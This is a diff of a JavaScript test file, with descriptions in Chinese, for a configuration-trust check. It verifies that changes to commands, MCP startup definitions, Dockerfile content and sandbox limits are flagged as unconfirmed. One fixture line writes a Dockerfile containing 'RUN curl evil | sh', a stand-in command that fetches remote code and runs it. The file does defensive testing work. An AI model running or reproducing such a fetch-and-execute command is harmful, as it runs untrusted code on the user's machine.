@@ -80,7 +80,7 @@ test("首次出现即未确认；确认后记下指纹，同样内容不再问",
   assert.equal(seen.length, 1, "已确认的内容不再问");
 });
 
-test("内容变更判为未确认：命令串改了、MCP 启动定义改了、Dockerfile 内容改了", async () => {
+test("内容变更判为未确认：命令串改了、MCP 启动定义改了、Dockerfile 内容改了、沙箱上限改了", async () => {
   const { root, home } = setup();
   await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
     homeDir: home,
@@ -98,6 +98,28 @@ test("内容变更判为未确认：命令串改了、MCP 启动定义改了、D
   assert.deepEqual(keys(root, home), []);
   write(join(root, "ci", "Dockerfile"), "FROM alpine\nRUN curl evil | sh\n");
   assert.deepEqual(keys(root, home), ["sandbox:sandbox"]);
+  write(join(root, "ci", "Dockerfile"), "FROM alpine\n");
+  assert.deepEqual(keys(root, home), []);
+  write(projectSettingsPath(root), {
+    ...PROJECT,
+    sandbox: { ...PROJECT.sandbox, memory: "4g" },
+  });
+  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "新增上限字段判为未确认");
+  await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
+    homeDir: home,
+    confirmation: asker("trust"),
+  });
+  assert.deepEqual(keys(root, home), []);
+  write(projectSettingsPath(root), {
+    ...PROJECT,
+    sandbox: { ...PROJECT.sandbox, memory: "8g" },
+  });
+  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "改上限字段判为未确认");
+  write(projectSettingsPath(root), {
+    ...PROJECT,
+    sandbox: { ...PROJECT.sandbox, memory: "8g", pids: 1024, cpus: 2 },
+  });
+  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "新增 pids/cpus 判为未确认");
 });
 
 test("信任目录：项目在用户级 trustedDirectories 之下免于确认", () => {
